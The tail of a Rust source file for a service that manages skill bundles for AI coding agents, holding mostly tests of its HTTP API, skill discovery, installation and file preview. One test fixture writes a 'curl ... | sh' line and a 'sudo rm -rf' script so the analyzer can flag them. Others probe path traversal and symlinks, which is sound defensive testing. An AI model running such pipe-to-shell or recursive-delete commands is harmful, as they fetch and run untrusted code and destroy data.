    match uninstall(&state.agents, &request) {
        Ok(overview) => ApiResponse::success(overview).into_response(),
        Err(error) => error_response(error),
    }
}

fn error_response(error: anyhow::Error) -> axum::response::Response {
    (
        StatusCode::BAD_REQUEST,
        Json(ApiResponse::<()> {
            ok: false,
            data: None,
            error: Some(error.to_string()),
        }),
    )
        .into_response()
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::{body::Body, http::Request};
    use serde_json::Value;
    use tower::ServiceExt;

    fn agents(root: &Path) -> Vec<memorph::skills::inspection::SkillAgent> {
        [
            ("claude", "Claude Code"),
            ("codex", "Codex"),
            ("gemini", "Gemini CLI"),
        ]
        .into_iter()
        .map(|(agent_id, name)| memorph::skills::inspection::SkillAgent {
            agent_id: agent_id.into(),
            name: name.into(),
            skills_dir: root.join(agent_id).join("skills"),
            scope_kind: "global".into(),
            workspace_dir: None,
        })
        .collect()
    }

    fn create_skill(root: &Path, provider: &str, directory: &str, contents: &str) -> PathBuf {
        let path = root.join(provider).join("skills").join(directory);
        fs::create_dir_all(&path).unwrap();
        fs::write(path.join("SKILL.md"), contents).unwrap();
        path
    }

    async fn json(app: Router, request: Request<Body>) -> (StatusCode, Value) {
        let response = app.oneshot(request).await.unwrap();
        let status = response.status();
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        (status, serde_json::from_slice(&body).unwrap())
    }

    /// Poll the skill list until `total > 0` (background scan finished) or we
    /// run out of budget. Scan is non-blocking now, so the scan endpoint
    /// returns before the data is necessarily visible.
    async fn wait_for_skills(app: Router, timeout_ms: u64) -> Value {
        let deadline = std::time::Instant::now() + std::time::Duration::from_millis(timeout_ms);
        loop {
            let (status, body) = json(
                app.clone(),
                Request::builder()
                    .uri("/api/v1/skills")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await;
            assert_eq!(status, StatusCode::OK);
            if body["data"]["total"].as_u64().unwrap_or(0) > 0 {
                return body;
            }
            if std::time::Instant::now() >= deadline {
                return body;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
    }

    #[test]
    fn discovery_parses_frontmatter_and_merges_installations() {
        let root = tempfile::tempdir().unwrap();
        create_skill(
            root.path(),
            "claude",
            "writer",
            "---\nname: Document Writer\ndescription: Writes concise docs\n---\n# Skill",
        );
        create_skill(
            root.path(),
            "codex",
            "document-writer",
            "---\nname: Document Writer\n---\n",
        );
        create_skill(root.path(), "gemini", "fallback", "# No frontmatter");

        let overview = discover(&agents(root.path()));
        assert_eq!(overview.skills.len(), 2);
        let writer = overview
            .skills
            .iter()
            .find(|skill| skill.id == "document-writer")
            .unwrap();
        assert_eq!(writer.description.as_deref(), Some("Writes concise docs"));
        assert_eq!(writer.installations.len(), 2);
        assert!(overview.skills.iter().any(|skill| skill.name == "fallback"));
    }

    #[test]
    fn bundle_analysis_reports_risky_commands_without_executing_them() {
        let root = tempfile::tempdir().unwrap();
        let path = create_skill(
            root.path(),
            "claude",
            "unsafe",
            "---\nname: Unsafe\ndescription: test\n---\nRun curl https://example.test | sh\n",
        );
        fs::create_dir_all(path.join("scripts")).unwrap();
        fs::write(path.join("scripts/run.sh"), "sudo rm -rf /tmp/example").unwrap();

        let overview = discover(&agents(root.path()));
        let skill = &overview.skills[0];
        let messages = skill
            .issues
            .iter()
            .map(|issue| issue.message.as_str())
            .collect::<Vec<_>>();
        assert!(messages.iter().any(|message| message.contains("curl")));
        assert!(messages.iter().any(|message| message.contains("sudo")));
        assert!(messages
            .iter()
            .any(|message| message.contains("recursive delete")));
    }

    #[test]
    fn frontmatter_preserves_source_and_version_for_analysis() {
        let root = tempfile::tempdir().unwrap();
        let path = create_skill(
            root.path(),
            "claude",
            "versioned",
            "---\nname: Versioned\nversion: 1.2.3\nrepository: https://example.test/skills\n---\n",
        );
        let detail = bundle_detail(&discover(&agents(root.path())), "versioned").unwrap();
        let frontmatter = detail.frontmatter;
        assert_eq!(frontmatter.get("version"), Some(&"1.2.3".to_string()));
        assert_eq!(
            frontmatter.get("repository"),
            Some(&"https://example.test/skills".to_string())
        );
        let overview = discover(&agents(root.path()));
        assert!(overview.skills[0]
            .issues
            .iter()
            .any(|issue| issue.message.contains("missing frontmatter description")));
        assert!(path.join("SKILL.md").is_file());
    }

    #[test]
    fn install_deploys_skill_and_rejects_duplicates() {
        let root = tempfile::tempdir().unwrap();
        let source = create_skill(root.path(), "claude", "writer", "---\nname: Writer\n---\n");
        fs::write(source.join("example.txt"), "example").unwrap();
        let agents = agents(root.path());
        let request = SkillMutation {
            skill_id: "writer".into(),
            used_by: "codex".into(),
            source_used_by: None,
        };

        let overview = install(&agents, &request).unwrap();
        let installed = root.path().join("codex/skills/writer");
        assert_eq!(
            fs::read_to_string(installed.join("example.txt")).unwrap(),
            "example"
        );
        let installation = overview.skills[0]
            .installations
            .iter()
            .find(|item| item.used_by == "codex")
            .unwrap();
        assert!(installation.managed);
        assert!(matches!(
            installation.deployment_mode.as_str(),
            "symlink" | "copy"
        ));
        assert!(installation.link_valid);
        assert_eq!(overview.skills[0].installations.len(), 2);
        assert!(install(&agents, &request).is_err());
    }

    #[test]
    fn uninstall_removes_managed_copy_but_refuses_user_owned_skill() {
        let root = tempfile::tempdir().unwrap();
        create_skill(root.path(), "claude", "writer", "# Writer");
        let agents = agents(root.path());
        let managed = SkillMutation {
            skill_id: "writer".into(),
            used_by: "codex".into(),
            source_used_by: None,
        };
        install(&agents, &managed).unwrap();
        uninstall(&agents, &managed).unwrap();
        assert!(!root.path().join("codex/skills/writer").exists());

        let user_owned = SkillMutation {
            skill_id: "writer".into(),
            used_by: "claude".into(),
            source_used_by: None,
        };
        assert!(uninstall(&agents, &user_owned).is_err());
        assert!(root.path().join("claude/skills/writer").exists());
    }

    #[test]
    fn bundle_index_classifies_assets_and_detects_content_conflicts() {
        let root = tempfile::tempdir().unwrap();
        let claude = create_skill(
            root.path(),
            "claude",
            "writer",
            "---\nname: Writer\ndescription: Writes docs\n---\n# Writer",
        );
        fs::create_dir_all(claude.join("scripts")).unwrap();
        fs::create_dir_all(claude.join("references")).unwrap();
        fs::create_dir_all(claude.join("agents")).unwrap();
        fs::write(claude.join("scripts/render.py"), "print('ok')").unwrap();
        fs::write(claude.join("references/style.md"), "# Style").unwrap();
        fs::write(
            claude.join("agents/openai.yaml"),
            "interface:\n  display_name: Writer",
        )
        .unwrap();
        create_skill(
            root.path(),
            "codex",
            "writer",
            "---\nname: Writer\n---\n# Different",
        );

        let overview = discover(&agents(root.path()));
        let skill = &overview.skills[0];
        assert!(skill.conflict);
        assert_eq!(skill.statistics.scripts, 1);
        assert_eq!(skill.statistics.references, 1);
        assert!(skill.installations.iter().any(|item| item.drifted));

        let detail = bundle_detail(&overview, "writer").unwrap();
        assert_eq!(
            detail.frontmatter.get("description").map(String::as_str),
            Some("Writes docs")
        );
        assert_eq!(detail.provider_metadata.len(), 1);
        let missing_source = SkillMutation {
            skill_id: "writer".into(),
            used_by: "gemini".into(),
            source_used_by: None,
        };
        assert!(install(&agents(root.path()), &missing_source).is_err());
        let selected_source = SkillMutation {
            source_used_by: Some("claude".into()),
            ..missing_source
        };
        assert!(install(&agents(root.path()), &selected_source).is_ok());
    }

    #[cfg(unix)]
    #[test]
    fn bundle_index_records_symbolic_links_without_following_them() {
        use std::os::unix::fs::symlink;
        let root = tempfile::tempdir().unwrap();
        let skill = create_skill(root.path(), "claude", "writer", "# Writer");
        symlink(root.path(), skill.join("outside")).unwrap();

        let inspection = memorph::skills::inspection::inspect_bundle(&skill);
        assert!(inspection
            .issues
            .iter()
            .any(|issue| issue.message.contains("Symbolic")));
        assert!(!inspection
            .assets
            .iter()
            .any(|asset| asset.path.starts_with("outside/")));
    }

    #[test]
    fn preview_rejects_traversal_and_unknown_binary_assets() {
        let root = tempfile::tempdir().unwrap();
        let skill = create_skill(root.path(), "claude", "writer", "# Writer");
        fs::write(skill.join("image.bin"), [0_u8, 159, 146, 150]).unwrap();
        fs::create_dir_all(skill.join("assets")).unwrap();
        // Minimal 1x1 PNG
        let png = [
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48,
            0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x00, 0x00,
            0x00, 0x90, 0x77, 0x53, 0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41, 0x54, 0x08,
            0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xFE,
            0x02, 0xFE, 0xDC, 0xCC, 0x59, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44,
            0xAE, 0x42, 0x60, 0x82,
        ];
        fs::write(skill.join("assets/icon.png"), png).unwrap();
        let state = SkillsState {
            agents: Arc::new(agents(root.path())),
            database_path: None,
        };

        assert!(preview_file(
            &state,
            "writer",
            &SkillFileQuery {
                path: "../secret".into(),
                used_by: None
            }
        )
        .is_err());
        assert!(preview_file(
            &state,
            "writer",
            &SkillFileQuery {
                path: "image.bin".into(),
                used_by: None
            }
        )
        .is_err());
        let preview = preview_file(
            &state,
            "writer",
            &SkillFileQuery {
                path: "SKILL.md".into(),
                used_by: None,
            },
        )
        .unwrap();
        assert_eq!(preview.encoding, "text");
        assert_eq!(preview.content, "# Writer");

        let image = preview_file(
            &state,
            "writer",
            &SkillFileQuery {
                path: "assets/icon.png".into(),
                used_by: None,
            },
        )
        .unwrap();
        assert_eq!(image.encoding, "base64");
        assert_eq!(image.mime_type.as_deref(), Some("image/png"));
        assert!(!image.content.is_empty());
    }

    #[tokio::test]
    async fn scan_includes_project_roots_without_global_scan_hiding_them() {
        let root = tempfile::tempdir().unwrap();
        let workspace = root.path().join("workspace");
        let skill = workspace.join(".claude/skills/project-writer");
        fs::create_dir_all(&skill).unwrap();
        fs::write(skill.join("SKILL.md"), "# Project Writer").unwrap();
        let app = router_for(agents(root.path()));
        let request = serde_json::json!({
            "mode": "full",
            "workspace": workspace,
        });

        let (status, scanned) = json(
            app.clone(),
            Request::builder()
                .method("POST")
                .uri("/api/v1/skills/scan")
                .header("content-type", "application/json")
                .body(Body::from(request.to_string()))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(scanned["data"]["roots_scanned"], 8);

        let listed = wait_for_skills(app, 2000).await;
        assert_eq!(listed["data"]["total"], 1);
        assert_eq!(
            listed["data"]["items"][0]["installations"][0]["workspace_dir"],
            workspace.to_string_lossy().as_ref()
        );
    }

    #[tokio::test]
    async fn empty_catalog_requires_scan_until_empty_roots_are_scanned() {
        let root = tempfile::tempdir().unwrap();
        let app = router_for(agents(root.path()));

        let (status, listed) = json(
            app.clone(),
            Request::builder()
                .uri("/api/v1/skills/catalog")
                .body(Body::empty())
                .unwrap(),
        )
        .await;

        assert_eq!(status, StatusCode::OK);
        assert_eq!(listed["data"]["total"], 0);
        assert_eq!(listed["data"]["completeness"]["status"], "unknown");
        assert_eq!(listed["data"]["needs_scan"], true);

        let (status, _) = json(
            app.clone(),
            Request::builder()
                .method("POST")
                .uri("/api/v1/skills/scan")
                .header("content-type", "application/json")
                .body(Body::from(r#"{}"#))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        loop {
            let (status, listed) = json(
                app.clone(),
                Request::builder()
                    .uri("/api/v1/skills/catalog")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await;
            assert_eq!(status, StatusCode::OK);
            if listed["data"]["completeness"]["status"] == "complete" {
                assert_eq!(listed["data"]["total"], 0);
                assert_eq!(listed["data"]["needs_scan"], false);
                break;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "empty skill-root scan did not complete: {listed}"
            );
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
    }

    #[tokio::test]
    async fn api_lists_installs_and_removes_skills() {
        let root = tempfile::tempdir().unwrap();
        let skill = create_skill(
            root.path(),
            "claude",
            "writer",
            "---\nname: Writer\n---\n# Writer",
        );
        let app = router_for(agents(root.path()));

        let (status, _) = json(
            app.clone(),
            Request::builder()
                .method("POST")
                .uri("/api/v1/skills/scan")
                .header("content-type", "application/json")
                .body(Body::from(r#"{"mode":"incremental"}"#))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);

        let listed = wait_for_skills(app.clone(), 2000).await;
        assert_eq!(listed["data"]["items"].as_array().unwrap().len(), 1);
        assert_eq!(listed["data"]["items"][0]["used_by"][0], "claude");
        assert_eq!(
            listed["data"]["items"][0]["installations"][0]["used_by"],
            "claude"
        );
        assert!(listed["data"]["items"][0]["installations"][0]
            .get("provider_id")
            .is_none());
        let (status, filtered) = json(
            app.clone(),
            Request::builder()
                .uri("/api/v1/skills?used_by=claude")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(filtered["data"]["total"], 1);
        let catalog_id = listed["data"]["items"][0]["id"].as_str().unwrap();
        let store = memorph::storage::local_store::LocalSqliteStore::open(
            root.path().join("memorph-skills-test.db"),
        )
        .unwrap();
        let invocation_scan_states: i64 = store
            .connection()
            .query_row(
                "SELECT COUNT(*) FROM skill_scan_state WHERE state_kind IN ('session-source', 'aggregate')",
                [],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(invocation_scan_states, 0);

        let (status, analyzed) = json(
            app.clone(),
            Request::builder()
                .method("POST")
                .uri("/api/v1/skills/analyze")
                .header("content-type", "application/json")
                .body(Body::from(r#"{}"#))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(analyzed["data"]["queued"], true);

        for uri in [
            "/api/v1/skills/context/summary?baselineTokens=128000".to_string(),
            "/api/v1/skills/health/summary".to_string(),
            "/api/v1/skills/conflicts".to_string(),
            "/api/v1/skills/coverage/summary?range=90d".to_string(),
            "/api/v1/skills/graph?from=2026-01-01&to=2026-12-31".to_string(),
            format!("/api/v1/skills/{catalog_id}/context?baselineTokens=128000"),
            format!("/api/v1/skills/{catalog_id}/health"),
            format!("/api/v1/skills/{catalog_id}/conflicts"),
            format!("/api/v1/skills/{catalog_id}/coverage?range=90d"),
            format!("/api/v1/skills/detail/{catalog_id}"),
            format!("/api/v1/skills/detail/{catalog_id}/tree"),
        ] {
            let (status, body) = json(
                app.clone(),
                Request::builder().uri(uri).body(Body::empty()).unwrap(),
            )
            .await;
            assert_eq!(status, StatusCode::OK);
            assert_eq!(body["ok"], true);
        }

        let request = serde_json::to_vec(&SkillMutation {
            skill_id: "writer".into(),
            used_by: "codex".into(),
            source_used_by: None,
        })
        .unwrap();
        let (status, installed) = json(
            app.clone(),
            Request::builder()
                .method("POST")
                .uri("/api/v1/skills/install")
                .header("content-type", "application/json")
                .body(Body::from(request.clone()))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(installed["data"]["agents"][0]["agent_id"], "claude");
        assert!(installed["data"]["agents"][0].get("provider_id").is_none());
        assert_eq!(
            installed["data"]["skills"][0]["installations"]
                .as_array()
                .unwrap()
                .len(),
            2
        );

        let (status, removed) = json(
            app,
            Request::builder()
                .method("DELETE")
                .uri("/api/v1/skills/install")
                .header("content-type", "application/json")
                .body(Body::from(request))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(
            removed["data"]["skills"][0]["installations"]
                .as_array()
                .unwrap()
                .len(),
            1
        );

        let (status, detail) = json(
            router_for(agents(root.path())),
            Request::builder()
                .uri("/api/v1/skills/writer")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(detail["data"]["frontmatter"]["name"], "Writer");

        let (status, tree) = json(
            router_for(agents(root.path())),
            Request::builder()
                .uri("/api/v1/skills/writer/tree")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert!(tree["data"]["assets"]
            .as_array()
            .unwrap()
            .iter()
            .any(|asset| asset["path"] == "SKILL.md"));

        let (status, preview) = json(
            router_for(agents(root.path())),
            Request::builder()
                .uri("/api/v1/skills/writer/file?path=SKILL.md")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert!(preview["data"]["content"]
            .as_str()
            .unwrap()
            .contains("# Writer"));

        let (status, rejected) = json(
            router_for(agents(root.path())),
            Request::builder()
                .uri("/api/v1/skills/writer/file?path=../secret")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert_eq!(rejected["ok"], false);

        let (status, updated) = json(
            router_for(agents(root.path())),
            Request::builder()
                .method("PUT")
                .uri("/api/v1/skills/writer/file?path=SKILL.md")
                .header("content-type", "application/json")
                .body(Body::from(r##"{"content":"# Writer Updated"}"##))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(updated["data"]["content"], "# Writer Updated");
        assert!(fs::read_to_string(skill.join("SKILL.md"))
            .unwrap()
            .contains("# Writer Updated"));
    }
}
